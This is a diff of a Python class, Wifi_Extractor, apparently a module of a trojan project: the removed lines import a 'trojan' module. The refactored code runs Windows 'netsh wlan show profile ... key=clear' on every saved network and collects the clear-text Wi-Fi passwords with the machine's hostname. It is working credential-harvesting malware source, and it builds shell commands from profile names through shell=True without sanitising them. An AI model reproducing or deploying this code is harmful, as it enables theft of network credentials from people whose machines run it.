@@ -1,29 +1,40 @@
 import subprocess
 import re
-import trojan as Trojan
-from trojan import *
+import socket
 
-class Wifi_Extractor():
+class Wifi_Extractor:
     def __init__(self):
-        self.result = None
+        self.hostname = socket.gethostname()
 
-    def wifi_passwords():
-        result = ""
-        result +=f'Wifi Passwords for {Trojan().get_hostname()} : \n'
+    #MAIN FUNCTION
+    def extract_wifi_passwords(self):
+        wifi_networks = self._get_wifi_profiles()
+        wifi_passwords = {}
+
+        for network in wifi_networks:
+            key_content = self._get_wifi_key_content(network)
+            if key_content is not None:
+                wifi_passwords[network] = key_content
+
+        return wifi_passwords
+    #MAIN FUNCTION
+    
+    def _get_wifi_profiles(self):
         command = "netsh wlan show profile"
-        networks = subprocess.check_output(command,shell=True)
+        networks = subprocess.check_output(command, shell=True)
         output_str = networks.decode("utf-8")
-        network_names_list = re.findall("(?:Profile\s*:\s)(.*)",output_str)
-        for networks in network_names_list:
-            command = f'netsh wlan show profile "{networks}" key=clear'
-            try:
-                current_result = subprocess.check_output(command,shell=True)
-                output_str = current_result.decode("utf-8")
-            except (subprocess.CalledProcessError,UnicodeDecodeError) :
-                continue     
-            try:
-                key_content = re.search(r"Key Content\s+:\s(.+)\r",output_str).group(1)
-            except AttributeError:
-                continue
-            result +=f'{networks} : {key_content} \n'
-        return result
+        profiles = re.findall(r"(?:Profile\s*:\s)(.*)", output_str)
+        return profiles
+
+    def _get_wifi_key_content(self, profile):
+        command = f'netsh wlan show profile "{profile}" key=clear'
+        try:
+            current_result = subprocess.check_output(command, shell=True)
+            output_str = current_result.decode("utf-8")
+        except (subprocess.CalledProcessError, UnicodeDecodeError):
+            return None
+        try:
+            key_content = re.search(r"Key Content\s+:\s(.+)\r", output_str).group(1)
+            return key_content
+        except AttributeError:
+            return None
